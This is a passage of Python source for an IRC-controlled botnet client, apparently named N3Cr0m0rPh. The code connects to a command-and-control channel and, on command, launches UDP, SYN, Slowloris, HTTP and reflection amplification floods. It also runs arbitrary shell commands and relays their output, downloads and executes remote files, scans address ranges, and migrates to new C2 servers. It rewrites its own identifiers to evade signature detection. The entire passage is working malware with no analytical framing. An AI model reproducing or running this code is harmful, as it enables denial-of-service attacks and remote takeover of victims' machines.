                self.exploit(IP, 443)
            except Exception as e:
                pass

    def INIT_IRC_CONNECTION(self):
        IRC_SOCK_RECV=""

        self.IRC_SOCK=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.IRC_SOCK.connect((self.C2_SERVER, self.C2_PORT))
        IS_IN_SECRET_CHAN = 0

        self.IRC_SOCK.send("NICK %s\n" % self.BOT_NICK)
        self.IRC_SOCK.send("USER %s %s localhost :%s\n" % (self.BOT_REALNAME, self.C2_SERVER, self.rantDwWe))
        gaKE = 1
        
        while 1:
            IRC_SOCK_RECV=IRC_SOCK_RECV+self.IRC_SOCK.recv(1024)
            IRC_SOCK_RECV_SPLIT=split(IRC_SOCK_RECV, "\n")
            IRC_SOCK_RECV=IRC_SOCK_RECV_SPLIT.pop( )
            
            for self.IRC_RECV_MSG in IRC_SOCK_RECV_SPLIT:
                self.IRC_RECV_MSG=rstrip(self.IRC_RECV_MSG)
                self.IRC_RECV_MSG=split(self.IRC_RECV_MSG)
                
                if(self.IRC_RECV_MSG[0]=="PING"):
                    self.IRC_SOCK.send("PONG %s\n" % self.IRC_RECV_MSG[1])
                
                elif(self.IRC_RECV_MSG[1]=="376" or self.IRC_RECV_MSG[1]=="422" or self.IRC_RECV_MSG[1]=="352"):
                    if IS_IN_SECRET_CHAN == 0:
                        self.IRC_SOCK.send("JOIN %s %s\n" % (self.C2_CHAN,self.C2_CHAN_KEY))
                        IS_IN_SECRET_CHAN = 1
                
                elif(self.IRC_RECV_MSG[1]=="433"):
                    self.BOT_NICK="[N3Cr0m0rPh]"+str(self.randStr)
                    self.IRC_SOCK.send("NICK %s\n" % self.BOT_NICK)
            try:
                
                if self.IRC_RECV_MSG[3]==":ddos.udpflood":
                    self.IRC_SOCK.send("PRIVMSG %s :Started UDP flood on %s:%s\n" % (self.C2_CHAN,self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5]))
                    threading.Thread(target=self.Do_UDP_Flood,args=(self.IRC_RECV_MSG[4],int(self.IRC_RECV_MSG[5]),int(self.IRC_RECV_MSG[6]),)).start()
                
                elif self.IRC_RECV_MSG[3]==":ddos.synflood":
                    self.IRC_SOCK.send("PRIVMSG %s :Started SYN flood on %s:%s with %s threads\n" % (self.C2_CHAN,self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5],self.IRC_RECV_MSG[7]))
                    for i in range(0, int(self.IRC_RECV_MSG[7])):
                        threading.Thread(target=self.Do_SYN_Flood,args=(self.IRC_RECV_MSG[4],int(self.IRC_RECV_MSG[5]),int(self.IRC_RECV_MSG[6],))).start()
                
                elif self.IRC_RECV_MSG[3]==":ddos.slowloris":
                    self.IRC_SOCK.send("PRIVMSG %s :Started Slowloris on %s with %s sockets\n" % (self.C2_CHAN,self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5]))
                    threading.Thread(target=self.Do_Slowloris_Flood,args=(self.IRC_RECV_MSG[4],int(self.IRC_RECV_MSG[5]),int(self.IRC_RECV_MSG[6],))).start()
                
                elif self.IRC_RECV_MSG[3]==":ddos.httpflood":
                    self.IRC_SOCK.send("PRIVMSG %s :Started HTTP flood on URL: %s with %s threads\n" % (self.C2_CHAN,self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[7]))
                    for i in range(0, int(self.IRC_RECV_MSG[7])):
                        threading.Thread(target=self.Do_HTTP_Flood,args=(self.IRC_RECV_MSG[4],int(self.IRC_RECV_MSG[5]),self.IRC_RECV_MSG[6],)).start()
                
                elif self.IRC_RECV_MSG[3]==":ddos.loadamp":
                    self.IRC_SOCK.send("PRIVMSG %s :Downloading %s list from %s\n" % (self.C2_CHAN,self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5]))
                    urllib.urlretrieve(self.IRC_RECV_MSG[5], "."+self.IRC_RECV_MSG[4])

                elif self.IRC_RECV_MSG[3]==":ddos.amp":
                    try:

                        if not os.path.exists("."+self.IRC_RECV_MSG[4]):
                            self.IRC_SOCK.send("PRIVMSG %s :Please load this type of amp list first.\n" % (self.C2_CHAN))
                            continue
                        domains="netflix.com,youtube.com,facebook.com,google.com,yahoo.com".split(",")

                        proto = self.IRC_RECV_MSG[4]
                        if self.IRC_RECV_MSG[4] == "dns":
                            try:
                                domains = self.IRC_RECV_MSG[8].split(",")
                            except:
                                pass
                        files[self.IRC_RECV_MSG[4]] = ["."+self.IRC_RECV_MSG[4]]

                        self.IRC_SOCK.send("PRIVMSG %s :Started %s amp flood on %s\n" % (self.C2_CHAN,self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5]))
                        self.DDoS(socket.gethostbyname(self.IRC_RECV_MSG[5]), int(self.IRC_RECV_MSG[6]), domains, int(self.IRC_RECV_MSG[7]))
                    
                    except Exception as e:
                        print(str(e))

                elif self.IRC_RECV_MSG[3]==":bot.scannetrange":
                    threading.Thread(target=self.RANGE_SCAN,args=(self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5],self.IRC_RECV_MSG[6],)).start()

                elif self.IRC_RECV_MSG[3]==":bot.shell":
                    try:
                            N3CTR0_SHELL = subprocess.Popen(self.IRC_RECV_MSG[4:],stdout=subprocess.PIPE)
                            for response in iter(N3CTR0_SHELL.stdout.readline,''):
                                    self.IRC_SOCK.send("PRIVMSG %s :%s\n" % (self.C2_CHAN,response))
                    except:
                            self.IRC_SOCK.send("PRIVMSG %s :Failed to execute command.\n" % self.C2_CHAN)
                elif self.IRC_RECV_MSG[3]==":bot.repack":
                    self.REWRITE_SELF()
                    self.IRC_SOCK.send("PRIVMSG %s :Repacked code!\n" % (self.C2_CHAN))

                elif self.IRC_RECV_MSG[3]==":http.download":
                    try:
                        urllib.urlretrieve(self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5])
                        self.IRC_SOCK.send("PRIVMSG %s :Downloaded.\n" % (self.C2_CHAN))
                    except:
                        self.IRC_SOCK.send("PRIVMSG %s :Could not download!\n" % (self.C2_CHAN))

                elif self.IRC_RECV_MSG[3]==":http.execute":
                    try:
                        urllib.urlretrieve(self.IRC_RECV_MSG[4],self.IRC_RECV_MSG[5])
                        if not platform.System.startswith("Windows"):
                            try:
                                os.chmod(self.IRC_RECV_MSG[5], 0777)
                            except:
                                pass
                        subprocess.Popen([("%s" % self.IRC_RECV_MSG[5])])
                        self.IRC_SOCK.send("PRIVMSG %s :Downloaded and executed.\n" % (self.C2_CHAN))
                    except:
                        self.IRC_SOCK.send("PRIVMSG %s :Could not download or execute!\n" % (self.C2_CHAN))

                elif self.IRC_RECV_MSG[3]==":bot.reset":
                    self.INSTALL_FEATURES()

                elif self.IRC_RECV_MSG[3]==":bot.move":
                    self.C2_SERVER=self.IRC_RECV_MSG[4] #Server
                    self.C2_CHAN=self.IRC_RECV_MSG[5] #Channel
                    self.C2_CHAN_KEY=self.IRC_RECV_MSG[6] #Channel key
                    
                    while 1:
                        try:
                            self.INSTALL_FEATURES()
                        except:
                            pass

                elif self.IRC_RECV_MSG[3]==":bot.killbyname":
                    os.popen("pkill -f %s" % self.IRC_RECV_MSG[4])
                    self.IRC_SOCK.send("PRIVMSG %s :Killed.\n" % (self.C2_CHAN))

                elif self.IRC_RECV_MSG[3]==":bot.killbypid":
                    os.kill(int(self.IRC_RECV_MSG[4]),9)
                    self.IRC_SOCK.send("PRIVMSG %s :Killed.\n" % (self.C2_CHAN))

                elif self.IRC_RECV_MSG[3]==":threads.end":
                    self.KILL_THREADS=1

                elif self.IRC_RECV_MSG[3]==":threads.begin":
                    self.KILL_THREADS=0

                elif self.IRC_RECV_MSG[3]==":sniff.start":
                    pause=0

                elif self.IRC_RECV_MSG[3]==":sniff.pause":
                    pause=1

                elif self.IRC_RECV_MSG[3]==":bot.getip":
                    self.IRC_SOCK.send("PRIVMSG %s :%s\n" % (self.C2_CHAN,urllib2.urlopen("https://api.ipify.org").read()))

                elif self.IRC_RECV_MSG[3]==":bot.ram":
                    meminfo = dict((i.split()[0].rstrip(':'),int(i.split()[1])) for i in open('/proc/meminfo').readlines())
                    mem_kib = meminfo['MemTotal']  # e.g. 3921852
                    self.IRC_SOCK.send("PRIVMSG %s :%s MB RAM total.\n" % (self.C2_CHAN, mem_kib / 1024))

                elif self.IRC_RECV_MSG[3]==":bot.killmyeyepeeusinghoic":
                   os.kill(os.getpid(),9)

            except IndexError or TypeError:
                pass

    def REWRITE_SELF(self):
        SELF_FILE=open(argv[0],"r")
        SELF_LINES=SELF_FILE.read()
        SELF_FILE.close()
        
        POLY_STRINGS=['rantDwWe','GIVE_RAND_STR','GIVE_RAND_STR','INIT_CONNECTION','INIT_IRC_CONNECTION','C2_PORT','Do_Slowloris_Flood','GET_ABSOLUTE_PATH','INSTALL_FEATURES','MBPS_SENT','MB_SENT','Do_UDP_Flood','BOT_REALNAME','C2_SERVER','OMpLRZVt','randStr','C2_CHAN','SENT','BOT_NICK','POLY_STRINGS','POLY_STRING','SELF_FILE','SELF_FILE_FINISHED','WxbKsWDa','REWRITE_SELF','Do_SYN_Flood','UDP_SOCK','IRC_SOCK','ATTACK_END','TARGET_PORT','ATTACK_END','ATTACK_TIME','TARGET_IP','IRC_SOCK_RECV_SPLIT','C2_CHAN_KEY','SELF_LINES','IRC_SOCK_RECV','MbEjgUOl','RECURSIVE_URL','len','eiaAnsBP','UDP_DATA','YZZEVzDy','OPEN_URL','url','sZSansOC','iKdvMuag','dodepTmF','QwAdOdJR','ncBrnXua','GxVCceRN','qRtXeNct','FocihdJO','TARGET','Do_HTTP_Flood','RANGE_SCAN','RANGE','OlxRQoIE','IRC_RECV_MSG','N3CTR0_SHELL','response','_','qSPBJJom','kwXLnXMT','KBrVuXmb','RyoybtRY','fNMASlgn','OQEPVvYq','WGpaXGEC','FvHHzlJu','MiwRFOVd','dLgrNjvV','RyoybtRY','HrkOVUQn', 'OmgjPABz', 'IS_IN_SECRET_CHAN', 'GET_HEADER', 'PuaorNVt', 'HEADER','sock', 'KgaiiMDa']
        for POLY_STRING in POLY_STRINGS:
            SELF_LINES=SELF_LINES.replace(POLY_STRING,self.GIVE_RAND_STR(8))
        
        SELF_FILE_FINISHED=open(argv[0],"w")
        SELF_FILE_FINISHED.write(SELF_LINES)
        SELF_FILE_FINISHED.close()

if __name__=="__main__":
    pid_file = 'SDKOEF'
    fp = open(pid_file, 'w')
    try:
        fcntl.lockf(fp, fcntl.LOCK_EX | fcntl.LOCK_NB)
        while 1:
            try:
                INIT_CONNECTION()
            except Exception as e:
                print(str(e))
                time.sleep(45)
    except IOError:
        exit(1)